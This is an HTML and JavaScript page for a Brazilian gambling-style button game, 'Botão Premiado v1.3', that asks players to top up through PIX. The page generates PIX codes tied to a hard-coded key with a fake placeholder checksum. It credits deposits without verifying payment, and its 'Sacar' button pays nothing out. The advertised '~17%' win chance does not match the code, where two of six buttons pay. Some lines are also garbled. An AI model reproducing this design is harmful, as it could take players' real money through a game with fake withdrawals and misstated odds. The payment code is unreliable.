<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8"> 
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Botão Premiado v1.3 - PIX RECARGA</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; margin: 0; }
        .container { max-width: 600px; margin: 0 auto; }
        .aviso { background: #ff4444; color: white; padding: 15px; border-radius: 10px; margin-bottom: 20px; font-weight: bold; }
        #saldo { font-size: 2em; color: #ffd700; margin: 20px 0; }
        .transacoes { background: rgba(255,255,255,0.1); padding: 20px; border-radius: 10px; margin: 20px 0; }
        input { padding: 10px; font-size: 16px; border: none; border-radius: 5px; width: 150px; }
        button { padding: 12px 20px; font-size: 16px; border: none; border-radius: 8px; cursor: pointer; margin: 5px; transition: transform 0.2s; }
        button:hover { transform: scale(1.05); }
        .pix-btn { background: #00C851 !important; color: white !important; font-weight: bold; font-size: 18px; }
        .tabuleiro { display: grid; grid-template-columns: repeat(3, 110px); gap: 8px; justify-content: center; margin: 30px auto; max-width: 400px; }
        .casa { width: 110px; height: 110px; font-size: 1.2em; font-weight: bold; transition: all 0.3s; }
        .casa.claro { background: #ffd700; color: #333; }
        .casa.escuro { background: #8b4513; color: white; }
        #pixQR { margin: 20px auto; padding: 20px; background: white; border-radius: 15px; color: #333; max-width: 300px; }
        #pixCodigo { background: #f8f9fa; padding: 15px; border-radius: 8px; font-family: monospace; font-size: 14px; word-break: break-all; margin: 10px 0; }
        @media (max-width: 500px) { .tabuleiro { grid-template-columns: repeat(2, 100px); } }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎮 Botão Premiado v1.3 - PIX</h1>
        <div class="aviso">⚠️ ATENÇÃO: O RISCO ESTÁ POR SUA CONTA! ~17% chance real de prêmio.</div>
        
        <div id="saldo">💰 Saldo: R$ 1500,00</div>
        
        <div class="transacoes">
            <h3>💳 Gerenciar Saldo</h3>
            <input type="number" id="valorInput" placeholder="Digite valor" min="10" step="10">
            <br>
            <button class="pix-btn" onclick="gerarPix()">🖥️ Gerar PIX</button>
...             <button onclick="depositar()">✅ Confirmar Depósito</button>
...             <button onclick="sacar()">🏧 Sacar</button>
...             <button onclick="salvar()">⭐ Salvar (+R$50)</button>
...             <button onclick="mostrarSaldo()">👁️ Ver Saldo</button>
...         </div>
...         
...         <div id="pixQR" style="display: none;">
...             <h3>📱 PIX para Recarga</h3>
...             <div id="pixCodigo"></div>
...             <button onclick="copiarPix()">📋 Copiar Código</button>
...             <canvas id="qrCodeCanvas" width="250" height="250"></canvas>
...             <p><small>Pague e clique em "Confirmar Depósito"!</small></p>
...         </div>
...         
...         <div class="tabuleiro" id="tabuleiro"></div>
...         <div id="mensagem" style="font-size: 1.2em; margin-top: 20px;"></div>
...     </div>
... 
...     <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
...     <script>
...         let saldoUsuario = 1500.00;
...         const botoesPremio = [{valor: 20, premio: false}, {valor: 100, premio: true}, {valor: 30, premio: false}, {valor: 40, premio: false}, {valor: 60, premio: true}, {valor: 50, premio: false}];
...         let pixAtual = '';
... 
...         // Dados PIX reais - SUBSTITUA PELOS SEUS
...         const PIX_DADOS = {
...             chave: 'sua-chave-pix@exemplo.com', // SUA CHAVE PIX
...             nome: 'Davi Rodrigues Dev Web',
...             cidade: 'FORTALEZA',
...             txid: 'BTN' + Date.now()
...         };
... 
...         function formatarValor(valor) { return 'R$ ' + valor.toFixed(2).replace('.', ','); }
...         function atualizarDisplay(msg = '') { document.getElementById('saldo').textContent = `💰 Saldo: ${formatarValor(saldoUsuario)}`; document.getElementById('mensagem').textContent = msg; }
... 
...         function gerarPix() {
...             const valor = parseFloat(document.getElementById('valorInput').value) || 50;
...             if (valor < 10) { alert('❌ Mínimo R$10'); return; }
... 
...             PIX_DADOS.txid = 'BTN' + Date.now();
            const payload = `00020101021226580014BR.GOV.BCB.PIX0114+55119876543210152040000530398654${valor.toFixed(2).replace('.', '')}5802BR5925Davi Rodrigues Dev Web6009FORTALEZA62160510${PIX_DADOS.txid}6304ABCD`;
            pixAtual = payload;

            document.getElementById('pixCodigo').textContent = pixAtual;
            document.getElementById('pixQR').style.display = 'block';
            
            // Gera QR Code
            QRCode.toCanvas(document.getElementById('qrCodeCanvas'), pixAtual, { width: 250 }, (error) => { if (error) console.error(error); });
            
            atualizarDisplay(`PIX gerado para ${formatarValor(valor)}! Copie ou escaneie.`);
        }

        function copiarPix() {
            navigator.clipboard.writeText(pixAtual).then(() => alert('✅ Código PIX copiado! Cole no app do banco.'));
        }

        function depositar() {
            const valor = parseFloat(document.getElementById('valorInput').value);
            if (valor >= 10 && pixAtual) {
                saldoUsuario += valor;
                atualizarDisplay(`✅ Depositou ${formatarValor(valor)} via PIX!`);
                document.getElementById('valorInput').value = '';
                document.getElementById('pixQR').style.display = 'none';
                pixAtual = '';
            } else {
                alert('❌ Gere o PIX primeiro!');
            }
        }

        // Resto das funções iguais (mantive do v1.2)
        function criarTabuleiro() {
            const tabuleiro = document.getElementById('tabuleiro');
            tabuleiro.innerHTML = '';
            botoesPremio.forEach((btn, index) => {
                const classe = (index % 2 === 0) ? 'claro' : 'escuro';
                const button = document.createElement('button');
                button.className = `casa ${classe}`;
                button.textContent = formatarValor(btn.valor);
                button.onclick = () => jogar(btn.premio, btn.valor);
                tabuleiro.appendChild(button);
            });
        }

        function jogar(ePremio, valorAposta) {
            if (saldoUsuario < 10) { alert('💸 Saldo insuficiente! Gere PIX.'); return; }
            saldoUsuario -= 10;
            if (ePremio) {
                const ganho = valorAposta * 2;
                saldoUsuario += ganho;
                atualizarDisplay(`🎉 PARABÉNS! Ganhou R$ ${ganho.toFixed(2)}!`);
            } else {
                atualizarDisplay(`😞 Perdeu R$10. Tente outro!`);
            }
            atualizarDisplay();
        }

        function sacar() {
            const valor = parseFloat(document.getElementById('valorInput').value);
            if (valor <= saldoUsuario && valor >= 10) {
                saldoUsuario -= valor;
                atualizarDisplay(`✅ Sacou ${formatarValor(valor)}!`);
                document.getElementById('valorInput').value = '';
            } else { alert('❌ Saldo insuficiente!'); }
        }

        function salvar() { saldoUsuario += 50; atualizarDisplay('⭐ Bônus: +R$50!'); }
        function mostrarSaldo() { alert(`💰 Saldo: ${formatarValor(saldoUsuario)}`); }

        atualizarDisplay('Clique "Gerar PIX" pra recarregar!'); criarTabuleiro();
    </script>
</body>
</html>
